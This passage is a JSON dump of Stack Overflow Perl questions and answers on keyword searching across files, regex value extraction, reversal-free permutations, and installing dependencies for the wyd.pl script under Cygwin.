}\n  }\n}\n</code></pre>\n\n<p>Regarding the questions in the comments below:</p>\n\n<p>The innermost loop just counts for line numbers <code>$l++</code> and puts out the finds in case of occurence - the <code>if /$search/</code> is still part of the statement above. It could also be written as</p>\n\n<pre><code>if ( /$search/ ) {\n  printf ...\n}\n</code></pre>\n\n<p>The <a href=\"http://perldoc.perl.org/functions/printf.html\" rel=\"nofollow noreferrer\">printf</a> is used to format the output. You could have also done this by simple using <code>print</code> and concatinate all the needed variables. I just prefer it this way.</p>\n\n<p>This assumes, that you want a list of found lines per keyword for every file. You have to switch the order and logic for <code>@keywords</code> and <code>@content</code> to get it line ordered.</p>\n\n<p>For additional functionality regarding comments in the keyword file, you would have to postprocess the content to discern the search terms from comments. Possibly in a hash with search term as key and comment as value. Then you could use only the hash keys for the search (see innermost loop) and put out the comment, if existing, as additional line.</p>\n"}], "owner": {"reputation": 23, "user_id": 7489409, "user_type": "registered", "accept_rate": 89, "profile_image": "https://www.gravatar.com/avatar/3e2cca9d0b23003b6b88e75700a0183c?s=128&d=identicon&r=PG&f=1", "display_name": "rocky", "link": "https://stackoverflow.com/users/7489409/rocky"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 155, "favorite_count": 0, "accepted_answer_id": 41937591, "answer_count": 1, "score": 1, "last_activity_date": 1485943259, "creation_date": 1485776140, "last_edit_date": 1485792044, "question_id": 41934916, "link": "https://stackoverflow.com/questions/41934916/perl-how-to-search-a-indefinite-list-of-keywords-from-a-list-of-files-in-a-fol", "title": "Perl : How to search a Indefinite list of keywords from a list of files in a folder", "body": "<p>Can anyone help me with Perl Script on below problem:</p>\n\n<p>File1.txt -> with keywords to search</p>\n\n<pre><code>Hello_ \nWorld!\n+Bye\nTemp-\n</code></pre>\n\n<p>File2 (Can be of any extension) In which Keywords to search for, File3, File4 ....</p>\n\n<p>I want to search for all the keywords from File1 in File2, and If they are found then print the keyword found along with the file number and line number In which this particular keyword is found.</p>\n\n<p>I want to keep these no of keywords and files to be indefinite - they can be added and modified.</p>\n\n<pre><code>open(MYINPUTFILE, \"&lt;expressions.txt\");\n# open for input\n\nmy(@lines) = &lt;MYINPUTFILE&gt;;\n#print @lines;\n\nmy @files = grep ( -f ,&lt;*main_log&gt;,&lt;*Project&gt;);\n\n$n = 0;\n$l = 0;\n#foreach my$file (@files) {\nforeach my $line (@lines) {\n    my @f = grep /$line/,@files;\n    print \"@f\\n\";\n}\n#}\n}\n</code></pre>\n\n<p>Issue - I tried to execute the above code but It does not print anything on my command prompt. I am using Windows 7</p>\n"}, {"tags": ["regex", "perl"], "answers": [{"comments": [{"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 2, "creation_date": 1485744021, "post_id": 41928305, "comment_id": 71037198, "body": "Or if you want to avoid global vars: <code>if ( my ($xyz0) = $line =~ m&#47;xyz0 = (\\S+)&#47;) { print $xyz0, &quot;\\n&quot;; }</code>"}, {"owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "edited": false, "score": 0, "creation_date": 1485745139, "post_id": 41928305, "comment_id": 71037422, "body": "@rahdirs And if you are uncertain about spaces around <code>=</code> make it <code>&#47;xyz0\\s*=\\s*(\\S+)&#47;</code>"}, {"owner": {"reputation": 13, "user_id": 5458921, "user_type": "registered", "accept_rate": 25, "profile_image": "https://i.stack.imgur.com/hN3Oa.jpg?s=128&g=1", "display_name": "rahdirs", "link": "https://stackoverflow.com/users/5458921/rahdirs"}, "edited": false, "score": 0, "creation_date": 1485746109, "post_id": 41928305, "comment_id": 71037636, "body": "How can I change the extracted value to some new number ? like 0.9 ?"}, {"owner": {"reputation": 6258, "user_id": 82262, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8ce15931410b388a52eb2df4a864137f?s=128&d=identicon&r=PG&f=1", "display_name": "Matt Jacob", "link": "https://stackoverflow.com/users/82262/matt-jacob"}, "reply_to_user": {"reputation": 13, "user_id": 5458921, "user_type": "registered", "accept_rate": 25, "profile_image": "https://i.stack.imgur.com/hN3Oa.jpg?s=128&g=1", "display_name": "rahdirs", "link": "https://stackoverflow.com/users/5458921/rahdirs"}, "edited": false, "score": 0, "creation_date": 1485748832, "post_id": 41928305, "comment_id": 71038131, "body": "@rahdirs one way would be with the <a href=\"http://perldoc.perl.org/perlop.html#Regexp-Quote-Like-Operators\" rel=\"nofollow noreferrer\">substitution operator</a>"}, {"owner": {"reputation": 13, "user_id": 5458921, "user_type": "registered", "accept_rate": 25, "profile_image": "https://i.stack.imgur.com/hN3Oa.jpg?s=128&g=1", "display_name": "rahdirs", "link": "https://stackoverflow.com/users/5458921/rahdirs"}, "reply_to_user": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "edited": false, "score": 0, "creation_date": 1485755664, "post_id": 41928305, "comment_id": 71039829, "body": "@zdim,@ysth,@ikegami:                                                                               <code>while(my $line = &lt;$fh&gt;){                                                                                        if( my ($xyz0) = $line =~m&#47;xyz0 = (\\S+)&#47;){                                                              print $xyz0,&quot;\\n&quot;; # this prints 0.005                                                        $new_value = 0.9;                                                                                    $xyz0 =~ s&#47;$xyz0&#47;$new_value&#47;; # How do I enter this value to file ?}}</code>."}, {"owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "reply_to_user": {"reputation": 13, "user_id": 5458921, "user_type": "registered", "accept_rate": 25, "profile_image": "https://i.stack.imgur.com/hN3Oa.jpg?s=128&g=1", "display_name": "rahdirs", "link": "https://stackoverflow.com/users/5458921/rahdirs"}, "edited": false, "score": 0, "creation_date": 1485756337, "post_id": 41928305, "comment_id": 71040030, "body": "@rahdirs In principle you need to rewrite the whole file.  Search SO for that, there already are many posts."}, {"owner": {"reputation": 13, "user_id": 5458921, "user_type": "registered", "accept_rate": 25, "profile_image": "https://i.stack.imgur.com/hN3Oa.jpg?s=128&g=1", "display_name": "rahdirs", "link": "https://stackoverflow.com/users/5458921/rahdirs"}, "reply_to_user": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "edited": false, "score": 0, "creation_date": 1485776267, "post_id": 41928305, "comment_id": 71050061, "body": "@zdim,@ysth,@ikegami: Why do I have to rewrite the whole file ? I only need to increment the value by 15% each time"}, {"owner": {"reputation": 87649, "user_id": 17389, "user_type": "registered", "accept_rate": 38, "profile_image": "https://www.gravatar.com/avatar/cd06d1314817ce946ab796af8750b56a?s=128&d=identicon&r=PG", "display_name": "ysth", "link": "https://stackoverflow.com/users/17389/ysth"}, "edited": false, "score": 0, "creation_date": 1485788148, "post_id": 41928305, "comment_id": 71058014, "body": "that&#39;s just how files work.  unless you are updating a specific number of bytes in the file, if you want to change something you need to rewrite the whole remainder of the file."}, {"owner": {"reputation": 87649, "user_id": 17389, "user_type": "registered", "accept_rate": 38, "profile_image": "https://www.gravatar.com/avatar/cd06d1314817ce946ab796af8750b56a?s=128&d=identicon&r=PG", "display_name": "ysth", "link": "https://stackoverflow.com/users/17389/ysth"}, "edited": false, "score": 0, "creation_date": 1485788185, "post_id": 41928305, "comment_id": 71058043, "body": "in any case, this is a very separate question, so ask it as one"}, {"owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "reply_to_user": {"reputation": 13, "user_id": 5458921, "user_type": "registered", "accept_rate": 25, "profile_image": "https://i.stack.imgur.com/hN3Oa.jpg?s=128&g=1", "display_name": "rahdirs", "link": "https://stackoverflow.com/users/5458921/rahdirs"}, "edited": false, "score": 0, "creation_date": 1485809359, "post_id": 41928305, "comment_id": 71070487, "body": "@rahdirs  See for example <a href=\"http://stackoverflow.com/questions/40269036/deleting-a-line-from-a-huge-file-in-perl/40269154#40269154\">this post</a>, for an explanation and for how to do what you need (and its comments for another explanation).  Please also see <a href=\"http://stackoverflow.com/help/someone-answers\">What should I do when someone answers my question?</a>"}], "tags": [], "owner": {"reputation": 87649, "user_id": 17389, "user_type": "registered", "accept_rate": 38, "profile_image": "https://www.gravatar.com/avatar/cd06d1314817ce946ab796af8750b56a?s=128&d=identicon&r=PG", "display_name": "ysth", "link": "https://stackoverflow.com/users/17389/ysth"}, "is_accepted": false, "score": 4, "last_activity_date": 1485743608, "creation_date": 1485743608, "answer_id": 41928305, "question_id": 41928251, "link": "https://stackoverflow.com/questions/41928251/reading-modifying-data-from-lib-file-using-perl/41928305#41928305", "title": "Reading &amp; modifying data from lib file using perl", "body": "<pre><code>if ($line =~ m/xyz0 = (\\S+)/){\n    print $1;\n}\n</code></pre>\n"}], "owner": {"reputation": 13, "user_id": 5458921, "user_type": "registered", "accept_rate": 25, "profile_image": "https://i.stack.imgur.com/hN3Oa.jpg?s=128&g=1", "display_name": "rahdirs", "link": "https://stackoverflow.com/users/5458921/rahdirs"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 79, "favorite_count": 1, "answer_count": 1, "score": -1, "last_activity_date": 1485744779, "creation_date": 1485742976, "last_edit_date": 1485744779, "question_id": 41928251, "link": "https://stackoverflow.com/questions/41928251/reading-modifying-data-from-lib-file-using-perl", "title": "Reading &amp; modifying data from lib file using perl", "body": "<p>I have to read &amp; modify certain data from .lib file.\nI could extract the line in which the data is present, but I could not extract the number associated with it.</p>\n\n<pre><code>open my $fh, \"&lt;\" ,\".....lib\" or die \"$!\";\n\nwhile(my $line = &lt;$fh&gt;) {\n      if ($line =~ m/xyz0/) {\n         print $line;\n      }\n} \n</code></pre>\n\n<p>The code outputs the line:</p>\n\n<pre><code>+xyz0 = 0.005 hg = 0.9 rvfd = 75\n</code></pre>\n\n<p>I want to extract the value beside xyz0 from it. How do I do it ?</p>\n"}, {"tags": ["string", "algorithm", "perl", "permutation", "combinatorics"], "comments": [{"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 0, "creation_date": 1485755777, "post_id": 41927693, "comment_id": 71039862, "body": "It is acceptable to generate <code>abc acb bca</code> instead of <code>abc acb bac</code>? Don&#39;t know if it matters."}, {"owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "edited": false, "score": 0, "creation_date": 1485763970, "post_id": 41927693, "comment_id": 71042919, "body": "Up to how many elements (how long can strings be)?"}, {"owner": {"reputation": 61, "user_id": 4305425, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/81ae30ccff5351aff69e7aa7c7f14018?s=128&d=identicon&r=PG&f=1", "display_name": "Hobbes", "link": "https://stackoverflow.com/users/4305425/hobbes"}, "reply_to_user": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "edited": false, "score": 0, "creation_date": 1485806852, "post_id": 41927693, "comment_id": 71069176, "body": "@zdim upto 8 elements"}, {"owner": {"reputation": 61, "user_id": 4305425, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/81ae30ccff5351aff69e7aa7c7f14018?s=128&d=identicon&r=PG&f=1", "display_name": "Hobbes", "link": "https://stackoverflow.com/users/4305425/hobbes"}, "reply_to_user": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 0, "creation_date": 1485806895, "post_id": 41927693, "comment_id": 71069198, "body": "@ikegami What you suggest would be acceptable, so long as it doesn&#39;t include bca in the list."}, {"owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "edited": false, "score": 0, "creation_date": 1485807399, "post_id": 41927693, "comment_id": 71069445, "body": "With &quot;up to 8&quot; even a brute-force check for inverses (additional O(N^2) complexity), after <i>all</i> permutations are formed, would be just fine -- for a single run.  In which case you can unify all cases, no tricks needed.  If you have many many runs then of course it adds up."}, {"owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "edited": false, "score": 0, "creation_date": 1485807481, "post_id": 41927693, "comment_id": 71069487, "body": "Can you also clarify: are these two the only cases to consider?  So either <code>abcde</code> or <code>10000</code>, no <code>abbcd</code> or <code>11000</code>? (See my answer)"}, {"owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "edited": false, "score": 0, "creation_date": 1485975115, "post_id": 41927693, "comment_id": 71152424, "body": "I completed my answer to cover all cases (and thus rearranged it)."}, {"owner": {"reputation": 61, "user_id": 4305425, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/81ae30ccff5351aff69e7aa7c7f14018?s=128&d=identicon&r=PG&f=1", "display_name": "Hobbes", "link": "https://stackoverflow.com/users/4305425/hobbes"}, "edited": false, "score": 0, "creation_date": 1486151827, "post_id": 41927693, "comment_id": 71238581, "body": "@zim the cases of 11000 or 11100  also of interest (so yes, duplicate elements of both symbols)"}, {"owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "edited": false, "score": 0, "creation_date": 1486159032, "post_id": 41927693, "comment_id": 71241831, "body": "OK, then for that case (<code>0</code> and <code>1</code>) you use the last section -- let me know if it&#39;d be helpful to add the code to exclude inverses.  The good thing there is that variations are much quicker."}], "answers": [{"tags": [], "owner": {"reputation": 87649, "user_id": 17389, "user_type": "registered", "accept_rate": 38, "profile_image": "https://www.gravatar.com/avatar/cd06d1314817ce946ab796af8750b56a?s=128&d=identicon&r=PG", "display_name": "ysth", "link": "https://stackoverflow.com/users/17389/ysth"}, "is_accepted": false, "score": 0, "last_activity_date": 1485742439, "last_edit_date": 1495542361, "creation_date": 1485741961, "answer_id": 41928157, "question_id": 41927693, "link": "https://stackoverflow.com/questions/41927693/string-permutations-in-lexigraphic-order-without-inversions-reversions/41928157#41928157", "title": "String permutations in lexigraphic order without inversions/reversions", "body": "<p>The answer in the suggested duplicate <a href=\"https://stackoverflow.com/questions/19081579/generating-permutations-which-are-not-mirrors-of-each-other\">Generating permutations which are not mirrors of each other</a> doesn't deal with repeated elements (because that wasn't part of that question) so naively following it would include e.g. both 0100 and  0010.  So this isn't an exact duplicate.  But the idea applies. </p>\n\n<p>Generate all the permutations but filter only for those with <code>$_ le reverse $_</code>.  I think this is essentially what you suggest in the question, but there's no need to compute a map when a simple expression applied to each permutation will tell you whether to include it or not.</p>\n"}, {"comments": [{"owner": {"reputation": 61, "user_id": 4305425, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/81ae30ccff5351aff69e7aa7c7f14018?s=128&d=identicon&r=PG&f=1", "display_name": "Hobbes", "link": "https://stackoverflow.com/users/4305425/hobbes"}, "edited": false, "score": 0, "creation_date": 1488892687, "post_id": 41932702, "comment_id": 72424759, "body": "I don&#39;t know why it was down voted, because it was exactly what I was looking for."}, {"owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "reply_to_user": {"reputation": 61, "user_id": 4305425, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/81ae30ccff5351aff69e7aa7c7f14018?s=128&d=identicon&r=PG&f=1", "display_name": "Hobbes", "link": "https://stackoverflow.com/users/4305425/hobbes"}, "edited": false, "score": 0, "creation_date": 1489021279, "post_id": 41932702, "comment_id": 72493569, "body": "@Hobbes Thank you for the comment.  I just don&#39;t like unsubstantiated downvotes (except when glaring and obvious to experts, or in few other circumstances). I think that they don&#39;t do any good favors to anyone, only puzzle and deter.  Most of the time that actually <i>harms</i> future readers. I&#39;ll do all I can to fix any and every thing that I know is off since I firstly want to leave good content behind. But for this a comment is immensely helpful, or often necessary.  However, all posts on this page got downvoted so I guess it&#39;s about something else."}, {"owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "reply_to_user": {"reputation": 61, "user_id": 4305425, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/81ae30ccff5351aff69e7aa7c7f14018?s=128&d=identicon&r=PG&f=1", "display_name": "Hobbes", "link": "https://stackoverflow.com/users/4305425/hobbes"}, "edited": false, "score": 0, "creation_date": 1489021448, "post_id": 41932702, "comment_id": 72493620, "body": "@Hobbes  I removed my original comment asking about that -- don&#39;t mean to leave your response hanging, but I never saw such comments achieve anything (it was typed in a spur of the moment).  Thank you for responding to it."}], "tags": [], "owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "is_accepted": true, "score": 0, "last_activity_date": 1488316120, "last_edit_date": 1495542863, "creation_date": 1485769180, "answer_id": 41932702, "question_id": 41927693, "link": "https://stackoverflow.com/questions/41927693/string-permutations-in-lexigraphic-order-without-inversions-reversions/41932702#41932702", "title": "String permutations in lexigraphic order without inversions/reversions", "body": "<p>Two possibilities represented by examples are for permutations where all elements are different (<code>abcd</code>), or for variations of two symbols where one appears exactly once (<code>1000</code>). More general cases are addressed as well.</p>\n\n<p><strong>Non-repeating elements (permutations)</strong></p>\n\n<p>Here we can make use of <a href=\"http://search.cpan.org/~edpratomo/Algorithm-Permute-0.12/Permute.pm\" rel=\"nofollow noreferrer\">Algorithm::Permute</a>, and of the particular observation: \n<em>Each permutation where the first element is greater than its last need be excluded</em>. It comes from <a href=\"https://stackoverflow.com/questions/19081579/generating-permutations-which-are-not-mirrors-of-each-other\">this post</a>, brought up in the <a href=\"https://stackoverflow.com/a/41928157/4653379\">answer by ysth</a>.</p>\n\n<p>This rule holds as follows. Consider substrings of a string without its first and last elements. For each such substring, all permutations of the string must contain its inverse. One of these, padded with last and first, is thus the inverse of the string. By construction, for each substring there is exactly one inverse. Thus permutations with swapped first and last elements of each string need be excluded.</p>\n\n<pre><code>use warnings;\nuse strict;\nuse feature 'say';\n\nuse Algorithm::Permute;\n\nmy $size = shift || 4;\nmy @arr = ('a'..'z')[0..$size-1];  # 1..$size for numbers\n\nmy @res;    \nAlgorithm::Permute::permute { \n    push @res, (join '', @arr) unless $arr[0] gt $arr[-1] \n} @arr; \n\nsay for @arr;\n</code></pre>\n\n<p>Problems <strong>with repetead elements</strong> (<code>abbcd</code>) can be treated the exact same way as above, and we need to also prune duplicates as permutations of <code>b</code> generate <code>abbcd</code> and <code>abbcd</code> (same)</p>\n\n<pre><code>use List::MoreUtils 'uniq';\n# build @res the same way as above ...\nmy @res = uniq @res;\n</code></pre>\n\n<p>Doing this during construction would not reduce complexity nor speed things up.</p>\n\n<p>The <code>permute</code> is quoted as the fastest method in the module, by far. It is about an order of magnitude faster than the other modules I tested (below), taking about 1 second for 10 elements on my system. But note that this problem's complexity is <em>factorial</em> in size. It blows up really fast.</p>\n\n<p><strong>Two symbols, where one appears exactly once (variations)</strong></p>\n\n<p>This is different and the above module is not meant for it, nor would the exclusion criterion work.  There are other modules, see at the end. However, the problem here is very simple.</p>\n\n<p>Start from <code>(1,0,0,...)</code> and 'walk' <code>1</code> along the list, up to the \"midpoint\" &ndash; which is the half for even sized list (4 for 8-long), or next past half for odd sizes (5 for 9-long). All strings obtained this way, by moving <code>1</code> by one position up to midpoint, form the set. The second \"half\" are their inversions.</p>\n\n<pre><code>use warnings;\nuse strict;\n\nmy $size = shift || 4;\nmy @n = (1, map { 0 } 1..$size-1);   \n\nmy @res = (join '', @n);       # first element of the result\n\nmy $end_idx = ( @n % 2 == 0 ) ? @n/2 - 1 : int(@n/2);\n\nforeach my $i (0..$end_idx-1)  # stop one short as we write one past $i\n{\n    @n[$i, $i+1] = (0, 1);     # move 1 by one position from where it is\n    push @res, join '', @n;\n}\n\nprint \"$_\\n\" for @res;\n</code></pre>\n\n<p>We need to stop before the last index since it has been filled in the previous iteration.</p>\n\n<p>This can be modified if <strong>both symbols (<code>0,1</code>) may appear repeatedly</strong>, but it is far simpler to use a module and then exclude inverses. The <a href=\"http://search.cpan.org/~fxn/Algorithm-Combinatorics-0.27/Combinatorics.pm\" rel=\"nofollow noreferrer\">Algorithm::Combinatorics</a> has routines for all needs here.  For all variations of <code>0</code> and <code>1</code> of lenght <code>$size</code>, where both may repeat</p>\n\n<pre><code>use Algorithm::Combinatorics qw(variations_with_repetition);\n\nmy @rep_vars = variations_with_repetition([0, 1], $size);\n</code></pre>\n\n<p>Inverse elements can then be excluded by a brute-force search, with <em>O(N<sup>2</sup>)</em> complexity at worst.</p>\n\n<p>Also note <a href=\"http://search.cpan.org/~allenday/Math-Combinatorics-0.09/lib/Math/Combinatorics.pm\" rel=\"nofollow noreferrer\">Math::Combinatorics</a>.</p>\n"}], "owner": {"reputation": 61, "user_id": 4305425, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/81ae30ccff5351aff69e7aa7c7f14018?s=128&d=identicon&r=PG&f=1", "display_name": "Hobbes", "link": "https://stackoverflow.com/users/4305425/hobbes"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 166, "favorite_count": 0, "accepted_answer_id": 41932702, "answer_count": 2, "score": 1, "last_activity_date": 1488316120, "creation_date": 1485737826, "question_id": 41927693, "link": "https://stackoverflow.com/questions/41927693/string-permutations-in-lexigraphic-order-without-inversions-reversions", "title": "String permutations in lexigraphic order without inversions/reversions", "body": "<p>The problem: </p>\n\n<p>I would like to generate a list of permutations of strings in lexigraphical but excluding string inversions. For instance, if I have the following string: abc, I would like to generate the following list</p>\n\n<pre><code>abc\nacb\nbac\n</code></pre>\n\n<p>instead of the typical</p>\n\n<pre><code>abc\nacb\nbac\nbca\ncab\ncba\n</code></pre>\n\n<p>An alternative example would look something like this:</p>\n\n<pre><code>100\n010\n</code></pre>\n\n<p>instead of </p>\n\n<pre><code>100\n010 \n001\n</code></pre>\n\n<p>Currently, I can generate the permutations using perl, but I am not sure on how to best remove the reverse duplicates. </p>\n\n<p>I had thought of applying something like the following:</p>\n\n<pre><code>create map with the following:\n1)   100\n2)   010\n3)   001\nthen perform the reversion/inversion on each element in the map and create a new map with:\n\n 1') 001\n 2') 010\n 3') 100\n</code></pre>\n\n<p>then compare and if the primed list value matches the original value, leave it in place, if it is different, if it's index is greater than the median index, keep it, else remove.</p>\n\n<p>Trouble is, I am not sure if this is an efficient approach or not.</p>\n\n<p>Any advice would be great.</p>\n"}, {"tags": ["windows", "perl", "cygwin"], "answers": [{"comments": [{"owner": {"reputation": 1744, "user_id": 1191147, "user_type": "registered", "accept_rate": 80, "profile_image": "https://i.stack.imgur.com/cZDaT.jpg?s=128&g=1", "display_name": "Hashim Aziz", "link": "https://stackoverflow.com/users/1191147/hashim-aziz"}, "edited": false, "score": 0, "creation_date": 1485836937, "post_id": 41930045, "comment_id": 71079133, "body": "Can I ask how you knew it requires these modules? There is very little documentation on WyD out there. Is there a way to determine the modules/dependencies that a script like WyD uses that I don&#39;t know of?"}, {"owner": {"reputation": 3105, "user_id": 4816207, "user_type": "registered", "profile_image": "https://lh4.googleusercontent.com/-jKNv2qYjH3g/AAAAAAAAAAI/AAAAAAAACnA/ZdLmPpJCAas/photo.jpg?sz=128", "display_name": "Prashant Pokhriyal", "link": "https://stackoverflow.com/users/4816207/prashant-pokhriyal"}, "reply_to_user": {"reputation": 1744, "user_id": 1191147, "user_type": "registered", "accept_rate": 80, "profile_image": "https://i.stack.imgur.com/cZDaT.jpg?s=128&g=1", "display_name": "Hashim Aziz", "link": "https://stackoverflow.com/users/1191147/hashim-aziz"}, "edited": false, "score": 3, "creation_date": 1485841983, "post_id": 41930045, "comment_id": 71080732, "body": "@Hashim I got into the same situation years ago. At that time I googled it and found this solution and it solved my issue."}], "tags": [], "owner": {"reputation": 3105, "user_id": 4816207, "user_type": "registered", "profile_image": "https://lh4.googleusercontent.com/-jKNv2qYjH3g/AAAAAAAAAAI/AAAAAAAACnA/ZdLmPpJCAas/photo.jpg?sz=128", "display_name": "Prashant Pokhriyal", "link": "https://stackoverflow.com/users/4816207/prashant-pokhriyal"}, "is_accepted": false, "score": 2, "last_activity_date": 1485757365, "creation_date": 1485757365, "answer_id": 41930045, "question_id": 41926832, "link": "https://stackoverflow.com/questions/41926832/running-wyd-pl-in-cygwin-cant-locate-object-method-init-via-package-wlgmod/41930045#41930045", "title": "Running wyd.pl in Cygwin - Can&#39;t locate object method &quot;init&quot; via package &quot;wlgmod::doc&quot;", "body": "<p>wyd.pl is perl script and it needs some perl modules to parse the files. Here\u2019s how to resolve:</p>\n\n<ol>\n<li><strong>Get <code>OpenOffice::OOD</code></strong></li>\n</ol>\n\n<blockquote>\n<pre><code>perl -MCPAN -e shell\n\ninstall OpenOffice::OOD\n</code></pre>\n</blockquote>\n\n<ol start=\"2\">\n<li><strong>Get <a href=\"http://mirror.amdmi3.ru/distfiles/\" rel=\"nofollow noreferrer\">catdoc</a></strong></li>\n</ol>\n\n<blockquote>\n<pre><code> tar xzvf catdoc-0.94.tar.gz\n\n ./configure\n\n make\n\n make install\n</code></pre>\n</blockquote>\n\n<ol start=\"3\">\n<li><strong>Get <a href=\"http://www.sentex.net/~mwandel/jhead\" rel=\"nofollow noreferrer\">jhead</a></strong></li>\n</ol>\n\n<blockquote>\n<pre><code>  tar xzvf jhead-latest.tar.gz\n\n  cd jhead-2.90\n\n  make\n</code></pre>\n</blockquote>\n\n<ol start=\"4\">\n<li><strong>Get <a href=\"http://www.ibiblio.org/mp3info\" rel=\"nofollow noreferrer\">mp3info</a></strong></li>\n</ol>\n\n<blockquote>\n<pre><code> cd mp3info-0.8.5a\n\n make mp3info\n\n make install-mp3info\n</code></pre>\n</blockquote>\n\n<ol start=\"5\">\n<li><code>apt-get install libncurses5-dev libncursesw5-dev</code></li>\n</ol>\n"}], "owner": {"reputation": 1744, "user_id": 1191147, "user_type": "registered", "accept_rate": 80, "profile_image": "https://i.stack.imgur.com/cZDaT.jpg?s=128&g=1", "display_name": "Hashim Aziz", "link": "https://stackoverflow.com/users/1191147/hashim-aziz"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 191, "favorite_count": 0, "answer_count": 1, "score": 0, "last_activity_date": 1584056664, "creation_date": 1485730036, "last_edit_date": 1584056664, "question_id": 41926832, "link": "https://stackoverflow.com/questions/41926832/running-wyd-pl-in-cygwin-cant-locate-object-method-init-via-package-wlgmod", "title": "Running wyd.pl in Cygwin - Can&#39;t locate object method &quot;init&quot; via package &quot;wlgmod::doc&quot;", "body": "<p>After a few days of trying to get <a href=\"http://www.darknet.org.uk/2006/11/wyd-automated-password-profiling-tool/\" rel=\"nofollow noreferrer\">wyd.pl</a> running on my Windows 7 machine, I'm finally pretty close. I've installed a working version of Cygwin on what must be the 5th attempt, and I now have a working bash shell. </p>\n\n<p>However, when running the following WyD command in bash:</p>\n\n<p><code>$ wyd.pl -b -e -t -s 3 -o \"OUTPUTFILE\" \"TARGETDIRECTORY\"</code></p>\n\n<p>...I get an error for a single missing dependency:</p>\n\n<blockquote>\n  <p>Can't 